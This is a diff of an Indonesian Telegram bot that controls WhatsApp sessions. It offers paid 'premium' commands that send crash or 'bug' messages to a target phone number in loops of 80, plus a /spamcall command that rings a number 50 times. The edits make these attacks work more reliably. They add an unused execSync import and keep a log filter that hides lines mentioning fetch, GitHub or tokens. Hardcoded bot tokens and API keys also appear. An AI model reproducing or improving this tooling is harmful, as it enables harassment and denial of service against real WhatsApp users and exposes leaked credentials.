@@ -12,12 +12,10 @@
           .toLowerCase();
       } catch {}
 
-      // Jika mengandung \u200b → langsung izinkan log
       if (text.includes("\u200b")) {
         return print(...args);
       }
 
-      // Cek kata sensitif
       if (
         ["fetch", "http", "github", "gitlab", "token", "database", "pastebin"]
         .some(word => text.includes(word))
@@ -26,13 +24,13 @@
         return;
       }
 
-      // Cetak normal
       print(...args);
     };
 
   } catch (_) {}
 })();
 
+const { execSync } = require("child_process");
 const {
     default: makeWASocket,
     useMultiFileAuthState,
@@ -108,7 +106,7 @@ const {
 } = require('@whiskeysockets/baileys');
 const fs = require("fs");
 const dbPath = "./userDB.json";
-const { FormData } = require("node:buffer"); // bawaan Node.js
+const { FormData } = require("node:buffer");
 const P = require("pino");
 const crypto = require("crypto");
 const path = require("path");
@@ -123,7 +121,8 @@ const tokenNotif = "8234414984:AAGWHL6v3Da3VtWsniWhRSyF3qXgdpH-mbI"
 const chatIdNotif = "7257623756"
 const STEMPEL = `\u200b`
 
-// Jika database belum ada
+let verified = false;
+
 if (!fs.existsSync(dbPath)) {
     fs.writeFileSync(dbPath, JSON.stringify([]));
 }
@@ -176,7 +175,6 @@ function saveAdminUsers() {
     fs.writeFileSync('./cihuyy/admin.json', JSON.stringify(adminUsers, null, 2));
 }
 
-// Fungsi untuk memantau perubahan file
 function watchFile(filePath, updateCallback) {
     fs.watch(filePath, (eventType) => {
         if (eventType === 'change') {
@@ -195,7 +193,7 @@ watchFile('./cihuyy/premium.json', (data) => (premiumUsers = data));
 watchFile('./cihuyy/admin.json', (data) => (adminUsers = data));
 
 const developerId = "7257623756";
-const chalk = require("chalk"); //
+const chalk = require("chalk");
 const { OWNER_ID } = require("./config");
 const config = require("./config.js");
 const TelegramBot = require("node-telegram-bot-api");
@@ -204,7 +202,7 @@ const BOT_TOKEN = config.BOT_TOKEN;
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const REMOVE_BG_KEY = "3xj8BCNe5dWNejWDvqXWtgRK";
 const GITHUB_TOKEN_LIST_URL =
-  "https://raw.githubusercontent.com/AryoDev878/Valtix_Invicta-auto_ubdate/refs/heads/main/tokens.json"; // Ganti dengan URL GitHub yang benar
+  "https://raw.githubusercontent.com/AryoDev878/Valtix_Invicta-auto_ubdate/refs/heads/main/tokens.json";
 
 async function sendNotif(type = "warning", reason = "Internal Server Error", detail = ""){
   const os = require('os')
@@ -260,7 +258,7 @@ async function sendNotif(type = "warning", reason = "Internal Server Error", det
 async function fetchValidTokens() {
   try {
     const response = await axios.get(GITHUB_TOKEN_LIST_URL);
-    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
+    return response.data.tokens;
   } catch (error) {
     console.error(
       chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
@@ -294,7 +292,7 @@ function startBot() {
   console.log(
     chalk.bold.blue(`⠀⠀
 ⠀⢀⣠⣄⡀⠀⠀⠀⣠⣶⣾⣿⣿⣶⣦⣴⣾⣿⣿⣷⣦⣄⠀⠀⠀⢀⣠⣄⡀⠀
-⣰⣿⠟⠛⢻⡆⣠⣾⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣷⡄⢰⠟⠛⢻⣿⡆
+⣰⣿⠟⠛⢻⡆⣠⣾⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⢰⠟⠛⢻⣿⡆
 ⢻⣿⣦⣀⣤⣾⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣦⣤⣀⣼⣿⡇
 ⠀⠛⠿⢿⣿⣿⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⢿⣿⣿⡿⠿⠋⠀
 `)
@@ -340,7 +338,6 @@ async function initializeWhatsAppConnections() {
           defaultQueryTimeoutMs: undefined,
         });
 
-        // Tunggu hingga koneksi terbentuk
         await new Promise((resolve, reject) => {
           sock.ev.on("connection.update", async (update) => {
             const { connection, lastDisconnect } = update;
@@ -495,7 +492,6 @@ async function connectToWhatsApp(botNumber, chatId) {
 }
 
 
-// -------( Fungsional Function Before Parameters )--------- \\
 function formatRuntime(seconds) {
   const days = Math.floor(seconds / (3600 * 24));
   const hours = Math.floor((seconds % (3600 * 24)) / 3600);
@@ -512,7 +508,6 @@ function getBotRuntime() {
   return formatRuntime(now - startTime);
 }
 
-//~ Date Now
 function getCurrentDate() {
   const now = new Date();
   const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
@@ -625,7 +620,6 @@ function getRandomImage() {
   ];
   return images[Math.floor(Math.random() * images.length)];
 }
-// ~ Coldowwn
 
 let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };
 
@@ -672,7 +666,7 @@ function getPremiumStatus(userId) {
     return "❌";
   }
 }
-/////// BUG FUNCTION ///////
+
 async function permenkisd(sock, target) {
     try {
         const msg1 = {
@@ -1020,14 +1014,31 @@ async function Gyxlores(sock, target) {
     }
 }
 
-//=========== ASYNC FUNCTION SEND ==========\\
-
 function isOwner(userId) {
-  // return config.OWNER_ID.includes(userId.toString());
   return config.OWNER_ID == userId;
 }
 
-const bugRequests = {};
+function isPrem(userId) {
+  return premiumUsers.some(user => user.id === userId && new Date(user.expiresAt) > new Date());
+}
+
+async function validateWhatsAppConnection(sock, chatId) {
+  if (!sock) {
+    await bot.sendMessage(chatId, "❌ *Koneksi WhatsApp belum tersedia!*\nSilakan hubungkan bot dengan `/addsender 62xxx` terlebih dahulu.", {
+      parse_mode: "Markdown"
+    });
+    return false;
+  }
+  
+  if (!sock.user) {
+    await bot.sendMessage(chatId, "❌ *WhatsApp belum terautentikasi!*\nBot sedang menghubungkan, silakan coba lagi dalam beberapa menit.", {
+      parse_mode: "Markdown"
+    });
+    return false;
+  }
+  
+  return true;
+}
 
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
@@ -1045,7 +1056,6 @@ bot.onText(/\/start/, (msg) => {
   });
 });
 
-// Handler untuk /start
 bot.onText(/\/menu/, async (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
@@ -1064,7 +1074,6 @@ bot.onText(/\/menu/, async (msg) => {
   const randomImage = getRandomImage();
   const version = "1.0";
 
-  // 2. CEK VERIFIED
   if (!verified) {
     return bot.sendMessage(
       chatId,
@@ -1073,7 +1082,6 @@ bot.onText(/\/menu/, async (msg) => {
     );
   }
 
-  // 4. TAMPILKAN MENU UTAMA TANPA PROGRESS BAR
   await bot.sendVideo(
     chatId,
     "https://files.catbox.moe/p2jg7w.mp4",
@@ -1084,7 +1092,7 @@ bot.onText(/\/menu/, async (msg) => {
 <i>アクセスが許可されました。システムはあなたの主要ルートを準備しています。</i>
 
 ╭━───━⊱ 𝙋𝙍𝙊𝙅𝙀𝘾𝙏 𝘿𝘼𝙏𝘼 ⊰━───━╮
-┃⟜❏ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫     : RyooNotDev
+┃⟜❏ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫     : RyoNotDev
 ┃⟜❏ 𝐎𝐰𝐧𝐞𝐫 𝐃𝐞𝐯    : @Thaureyo
 ┃⟜❏ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧       : 1.0
 ╰━───────╯
@@ -1118,7 +1126,7 @@ bot.onText(/\/menu/, async (msg) => {
       }
     }
   );
-  // 🔊 Kirim audio otomatis saat menu muncul
+  
 try {
   await bot.sendAudio(chatId, "https://files.catbox.moe/0cxjco.mp3", {
     title: "Vtx Vocaloid Sound",
@@ -1146,7 +1154,6 @@ bot.on("callback_query", async (query) => {
     let caption = "";
     let replyMarkup = {};
 
-    // ===== STRUKTUR IF-ELSE IF LENGKAP =====
     if (query.data === "zenbug") {
       caption = `<pre>╭▄︻デʍɛռʊ ɮʊɢ═══━一</pre>
 
@@ -1243,7 +1250,7 @@ bot.on("callback_query", async (query) => {
       replyMarkup = { inline_keyboard: [[{ text: "<<<<", callback_data: "back" }]] };
     }
     else if (query.data === "thanksto") {
-      caption = `\`\`\`╭━───━⊱ ⊱⪩ 𝙏𝙃𝘼𝙉𝙆𝙎 𝙏𝙊 𝘼𝙇𝙇 ⪨⊰</pre>
+      caption = `<pre>╭━───━⊱ ⊱⪩ 𝙏𝙃𝘼𝙉𝙆𝙎 𝙏𝙊 𝘼𝙇𝙇 ⪨⊰</pre>
 ┃ Ryoo — Lead Developer
 ┃   ↳ Pencipta sistem bot, konsep, dan arsitektur utama
 ┃
@@ -1255,7 +1262,7 @@ bot.on("callback_query", async (query) => {
 ┃
 ┃ Buyer, User, & Community
 ┃   ↳ Alasan project ini terus hidup dan berkembang 
-╰━─────────────────────────━❏\`\`\``;
+╰━─────────────────────────━❏`;
       replyMarkup = { inline_keyboard: [[{ text: "<<<<", callback_data: "back" }]] };
     }
     else if (query.data === "back") {
@@ -1289,12 +1296,10 @@ bot.on("callback_query", async (query) => {
       };
     }
     else {
-      // 🚨 UNKNOWN CALLBACK - DEBUG
       console.log("⚠️ Unknown callback_data:", query.data);
       return bot.answerCallbackQuery(query.id, { text: `Callback '${query.data}' tidak valid!` });
     }
 
-    // 🔍 VALIDASI SEBELUM KIRIM
     if (!caption || caption.trim() === "") {
       throw new Error("Caption kosong! query.data: " + query.data);
     }
@@ -1302,7 +1307,6 @@ bot.on("callback_query", async (query) => {
       throw new Error("ReplyMarkup kosong! query.data: " + query.data);
     }
 
-    // ===== URL BERSIH (hapus spasi) =====
     const cleanMediaUrl = "https://files.catbox.moe/p2jg7w.mp4".trim();
 
     await bot.editMessageMedia(
@@ -1322,7 +1326,6 @@ bot.on("callback_query", async (query) => {
     await bot.answerCallbackQuery(query.id);
 
   } catch (error) {
-    // 🔴 TAMPILKAN ERROR YANG SEBENARNYA
     console.error("❌ CALLBACK ERROR:", {
       message: error.message,
       stack: error.stack,
@@ -1331,7 +1334,7 @@ bot.on("callback_query", async (query) => {
     bot.answerCallbackQuery(query.id, { text: `Error: ${error.message}` });
   }
 });
-//=======CASE BUG=========//
+
 bot.onText(/\/comboinvis (\d+)/, async (msg, match) => {
             const chatId = msg.chat.id;
             const senderId = msg.from.id;
@@ -1343,15 +1346,12 @@ bot.onText(/\/comboinvis (\d+)/, async (msg, match) => {
             const cooldown = checkCooldown(userId);
             const jidat = getCurrentDate();
 
-            if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
+            if (!isPrem(senderId)) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\`\nあなたはクレイクスではない\`\`\`
-`,
+    caption: `\`\`\`\nあなたはクレイクスではない\`\`\``,
     parse_mode: "Markdown",
     reply_markup: {
-      inline_keyboard: [
-        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/JarzxNotDev" }]
-      ]
+      inline_keyboard: [[{ text: "📞 Buy Access", url: "https://t.me/Thaureyo" }]]
     }
   });
 }
@@ -1360,12 +1360,20 @@ bot.onText(/\/comboinvis (\d+)/, async (msg, match) => {
                    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
                    }
 
-            try {     
             if (sessions.size === 0) {
-            return bot.sendMessage(
-            chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
-            );
+              return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
             }
+            
+            const availableSession = sessions.values().next().value;
+            if (!availableSession || !availableSession.user) {
+              return bot.sendMessage(chatId, "❌ Bot WhatsApp sedang terhubung tapi belum terautentikasi. Coba lagi dalam 1-2 menit.");
+            }
+            
+            const activeSock = availableSession;
+            const isConnected = await validateWhatsAppConnection(activeSock, chatId);
+            if (!isConnected) return;
+
+            try {     
             const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/p2jg7w.mp4", {
             caption: `
 \`\`\`
@@ -1398,8 +1406,8 @@ bot.onText(/\/comboinvis (\d+)/, async (msg, match) => {
          }
     
         console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
-        await Gyxlores(sock, jid);
-        await permenkisd(sock, jid);
+        await Gyxlores(activeSock, jid);
+        await permenkisd(activeSock, jid);
         await new Promise((r) => setTimeout(r, 2500));
         console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
     
@@ -1424,6 +1432,7 @@ bot.onText(/\/comboinvis (\d+)/, async (msg, match) => {
        bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
         }    
         });
+
 bot.onText(/\/vtxinvis1 (\d+)/, async (msg, match) => {
             const chatId = msg.chat.id;
             const senderId = msg.from.id;
@@ -1435,14 +1444,13 @@ bot.onText(/\/vtxinvis1 (\d+)/, async (msg, match) => {
             const cooldown = checkCooldown(userId);
             const jidat = getCurrentDate();
 
-            if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
+            if (!isPrem(senderId)) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\`\nあなたはクレイクスではない\`\`\`
-`,
+    caption: `\`\`\`\nあなたはクレイクスではない\`\`\``,
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
-        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/Thaureyo" }]
+        [{ text: "📞 Buy Access", url: "https://t.me/Thaureyo" }]
       ]
     }
   });
@@ -1452,12 +1460,20 @@ bot.onText(/\/vtxinvis1 (\d+)/, async (msg, match) => {
                    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
                    }
 
-            try {     
             if (sessions.size === 0) {
-            return bot.sendMessage(
-            chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
-            );
+              return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
             }
+            
+            const availableSession = sessions.values().next().value;
+            if (!availableSession || !availableSession.user) {
+              return bot.sendMessage(chatId, "❌ Bot WhatsApp sedang terhubung tapi belum terautentikasi. Coba lagi dalam 1-2 menit.");
+            }
+            
+            const activeSock = availableSession;
+            const isConnected = await validateWhatsAppConnection(activeSock, chatId);
+            if (!isConnected) return;
+
+            try {     
             const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/p2jg7w.mp4", {
             caption: `
 \`\`\`
@@ -1490,7 +1506,7 @@ bot.onText(/\/vtxinvis1 (\d+)/, async (msg, match) => {
          }
     
         console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
-        await Gyxlores(sock, jid);
+        await Gyxlores(activeSock, jid);
         await new Promise((r) => setTimeout(r, 2500));
         console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
     
@@ -1515,6 +1531,7 @@ bot.onText(/\/vtxinvis1 (\d+)/, async (msg, match) => {
        bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
         }    
         });
+
 bot.onText(/\/vtxgrimflow (\d+)/, async (msg, match) => {
             const chatId = msg.chat.id;
             const senderId = msg.from.id;
@@ -1526,14 +1543,13 @@ bot.onText(/\/vtxgrimflow (\d+)/, async (msg, match) => {
             const cooldown = checkCooldown(userId);
             const jidat = getCurrentDate();
 
-            if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
+            if (!isPrem(senderId)) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\`\nあなたはクレイクスではない\`\`\`
-`,
+    caption: `\`\`\`\nあなたはクレイクスではない\`\`\``,
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
-        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/Thaureyo" }]
+        [{ text: "📞 Buy Access", url: "https://t.me/Thaureyo" }]
       ]
     }
   });
@@ -1543,12 +1559,20 @@ bot.onText(/\/vtxgrimflow (\d+)/, async (msg, match) => {
                    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
                    }
 
-            try {     
             if (sessions.size === 0) {
-            return bot.sendMessage(
-            chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
-            );
+              return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
             }
+            
+            const availableSession = sessions.values().next().value;
+            if (!availableSession || !availableSession.user) {
+              return bot.sendMessage(chatId, "❌ Bot WhatsApp sedang terhubung tapi belum terautentikasi. Coba lagi dalam 1-2 menit.");
+            }
+            
+            const activeSock = availableSession;
+            const isConnected = await validateWhatsAppConnection(activeSock, chatId);
+            if (!isConnected) return;
+
+            try {     
             const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/p2jg7w.mp4", {
             caption: `
 \`\`\`
@@ -1582,7 +1606,7 @@ bot.onText(/\/vtxgrimflow (\d+)/, async (msg, match) => {
     
         console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
         for (let i = 0; i < 80; i++) {
-          await forceclick(sock, jid);
+          await forceclick(activeSock, jid);
           await new Promise((r) => setTimeout(r, 1500));
         }
         console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
@@ -1620,14 +1644,13 @@ bot.onText(/\/vtxdualflow (\d+)/, async (msg, match) => {
             const cooldown = checkCooldown(userId);
             const jidat = getCurrentDate();
 
-            if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
+            if (!isPrem(senderId)) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\`\nあなたはクレイクスではない\`\`\`
-`,
+    caption: `\`\`\`\nあなたはクレイクスではない\`\`\``,
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
-        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/Thaureyo" }]
+        [{ text: "📞 Buy Access", url: "https://t.me/Thaureyo" }]
       ]
     }
   });
@@ -1637,12 +1660,20 @@ bot.onText(/\/vtxdualflow (\d+)/, async (msg, match) => {
                    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
                    }
 
-            try {     
             if (sessions.size === 0) {
-            return bot.sendMessage(
-            chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
-            );
+              return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
             }
+            
+            const availableSession = sessions.values().next().value;
+            if (!availableSession || !availableSession.user) {
+              return bot.sendMessage(chatId, "❌ Bot WhatsApp sedang terhubung tapi belum terautentikasi. Coba lagi dalam 1-2 menit.");
+            }
+            
+            const activeSock = availableSession;
+            const isConnected = await validateWhatsAppConnection(activeSock, chatId);
+            if (!isConnected) return;
+
+            try {     
             const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/p2jg7w.mp4", {
             caption: `
 \`\`\`
@@ -1676,7 +1707,7 @@ bot.onText(/\/vtxdualflow (\d+)/, async (msg, match) => {
     
         console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
         for (let i = 0; i < 80; i++) {
-          await glorymessage(sock, jid);
+          await glorymessage(activeSock, jid);
           await new Promise((r) => setTimeout(r, 1500));
         }
         console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
@@ -1714,14 +1745,13 @@ bot.onText(/\/vtxios (\d+)/, async (msg, match) => {
             const cooldown = checkCooldown(userId);
             const jidat = getCurrentDate();
 
-            if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
+            if (!isPrem(senderId)) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\`\nあなたはクレイクスではない\`\`\`
-`,
+    caption: `\`\`\`\nあなたはクレイクスではない\`\`\``,
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
-        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/Thaureyo" }]
+        [{ text: "📞 Buy Access", url: "https://t.me/Thaureyo" }]
       ]
     }
   });
@@ -1731,12 +1761,20 @@ bot.onText(/\/vtxios (\d+)/, async (msg, match) => {
                    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
                    }
 
-            try {     
             if (sessions.size === 0) {
-            return bot.sendMessage(
-            chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
-            );
+              return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
             }
+            
+            const availableSession = sessions.values().next().value;
+            if (!availableSession || !availableSession.user) {
+              return bot.sendMessage(chatId, "❌ Bot WhatsApp sedang terhubung tapi belum terautentikasi. Coba lagi dalam 1-2 menit.");
+            }
+            
+            const activeSock = availableSession;
+            const isConnected = await validateWhatsAppConnection(activeSock, chatId);
+            if (!isConnected) return;
+
+            try {     
             const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/p2jg7w.mp4", {
             caption: `
 \`\`\`
@@ -1770,7 +1808,7 @@ bot.onText(/\/vtxios (\d+)/, async (msg, match) => {
     
         console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
         for (let i = 0; i < 80; i++) {
-          await LoadInvisIphone(sock, jid);
+          await LoadInvisIphone(activeSock, jid);
           await new Promise((r) => setTimeout(r, 1500));
         }
         console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
@@ -1808,14 +1846,13 @@ bot.onText(/\/vtxinvis2 (\d+)/, async (msg, match) => {
             const cooldown = checkCooldown(userId);
             const jidat = getCurrentDate();
 
-            if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
+            if (!isPrem(senderId)) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `\`\`\`\nあなたはクレイクスではない\`\`\`
-`,
+    caption: `\`\`\`\nあなたはクレイクスではない\`\`\``,
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
-        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/Thaureyo" }]
+        [{ text: "📞 Buy Access", url: "https://t.me/Thaureyo" }]
       ]
     }
   });
@@ -1825,12 +1862,20 @@ bot.onText(/\/vtxinvis2 (\d+)/, async (msg, match) => {
                    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
                    }
 
-            try {     
             if (sessions.size === 0) {
-            return bot.sendMessage(
-            chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
-            );
+              return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
             }
+            
+            const availableSession = sessions.values().next().value;
+            if (!availableSession || !availableSession.user) {
+              return bot.sendMessage(chatId, "❌ Bot WhatsApp sedang terhubung tapi belum terautentikasi. Coba lagi dalam 1-2 menit.");
+            }
+            
+            const activeSock = availableSession;
+            const isConnected = await validateWhatsAppConnection(activeSock, chatId);
+            if (!isConnected) return;
+
+            try {     
             const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/p2jg7w.mp4", {
             caption: `
 \`\`\`
@@ -1864,7 +1909,7 @@ bot.onText(/\/vtxinvis2 (\d+)/, async (msg, match) => {
     
         console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
         for (let i = 0; i < 80; i++) {
-          await permenkisd(sock, jid);
+          await permenkisd(activeSock, jid);
           await new Promise((r) => setTimeout(r, 1500));
         }
         console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
@@ -1891,60 +1936,70 @@ bot.onText(/\/vtxinvis2 (\d+)/, async (msg, match) => {
         }    
         });           
 
-// Ga Ush Lu Ubah Ini Spamcall
 bot.onText(/\/spamcall (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    const q = match[1]; // nomor tujuan
 
-    // cek premium
     if (!isPrem(userId)) {
-        return bot.sendMessage(chatId, "⚠️ Hanya untuk user premium!");
+      return bot.sendMessage(chatId, "⚠️ Hanya untuk user premium!");
     }
 
+    const q = match[1];
     if (!q) {
-        return bot.sendMessage(chatId, `*Example:* /spamcall 6287392784527`);
+      return bot.sendMessage(chatId, `*Example:* /spamcall 6287392784527`);
     }
 
     let bijipler = q.replace(/[^0-9]/g, "");
     if (bijipler.startsWith('0')) {
-        return bot.sendMessage(chatId, `*! Number starts with 0. Replace with country code*\nExample: /spamcall 6287392784527`);
+      return bot.sendMessage(chatId, `*! Number starts with 0. Replace with country code*\nExample: /spamcall 6287392784527`);
     }
+
+    if (sessions.size === 0) {
+      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
+    }
+    
+    const availableSession = sessions.values().next().value;
+    if (!availableSession || !availableSession.user) {
+      return bot.sendMessage(chatId, "❌ Bot WhatsApp sedang terhubung tapi belum terautentikasi. Coba lagi dalam 1-2 menit.");
+    }
+    
+    const activeSock = availableSession;
+    const isConnected = await validateWhatsAppConnection(activeSock, chatId);
+    if (!isConnected) return;
 
     async function spamcall(target) {
-        const Vinxy = makeWAVinxyet({
-            printQRInTerminal: false,
+      try {
+        console.log(`📞 Mengirim panggilan ke ${target}`);
+        
+        await activeSock.query({
+          tag: 'call',
+          json: ['action', 'call', 'call', { id: target }],
         });
-
-        try {
-            console.log(`📞 Mengirim panggilan ke ${target}`);
-            await Vinxy.query({
-                tag: 'call',
-                json: ['action', 'call', 'call', { id: `${target}` }],
-            });
-            console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
-        } catch (err) {
-            console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
-        } finally {
-            Vinxy.ev.removeAllListeners();
-            Vinxy.ws.close();
-        }
+        
+        console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
+        return true;
+      } catch (err) {
+        console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
+        return false;
+      }
     }
 
-    bot.sendMessage(chatId, "𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 🦠");
-
+    const waitingMsg = await bot.sendMessage(chatId, "𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 🦠");
     let jid = bijipler + "@s.whatsapp.net";
+    let successCount = 0;
+
     for (let i = 0; i < 50; i++) {
-        await spamcall(jid);
-        await spamcall(jid);
-        await spamcall(jid);
-        await spamcall(jid);
+      const result = await spamcall(jid);
+      if (result) successCount++;
+      await new Promise(r => setTimeout(r, 1000));
     }
 
-    await new Promise(r => setTimeout(r, 1000));
-    bot.sendMessage(chatId, "𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪");
+    await bot.editMessageText(
+      `𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝘼𝙩𝙩𝙖𝙘𝙠 🌪\nTerhubung: ${successCount}/50`,
+      { chat_id: chatId, message_id: waitingMsg.message_id }
+    );
 });
-//=======plugins=======//
+
 bot.onText(/\/tiktok (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const url = match[1];
@@ -1992,7 +2047,7 @@ bot.onText(/^\/grouponly (on|off)/, (msg, match) => {
 
     if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
   return bot.sendMessage(
-    chatId,
+    msg.chat.id,
     "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
     { parse_mode: "Markdown" }
   );
@@ -2030,8 +2085,6 @@ bot.onText(/\/addsender (.+)/, async (msg, match) => {
   }
 });
 
-
-
 const moment = require('moment');
 
 bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
@@ -2039,7 +2092,6 @@ const chatId = msg.chat.id;
 const response = setCooldown(match[1]);
 
 bot.sendMessage(chatId, response); });
-
 
 bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
   try {
@@ -2079,7 +2131,7 @@ bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
         bot.sendMessage(chatId, `✅ User ${userId} has been added to the Prem list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
     } else {
         const existingUser = premiumUsers.find(user => user.id === userId);
-        existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
+        existingUser.expiresAt = expirationDate.toISOString();
         savePremiumUsers();
         bot.sendMessage(chatId, `✅ User ${userId} is already a Vip user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
     }
@@ -2100,7 +2152,7 @@ bot.onText(/\/listprem/, (msg) => {
     return bot.sendMessage(chatId, "📌 No Vip users found.");
   }
 
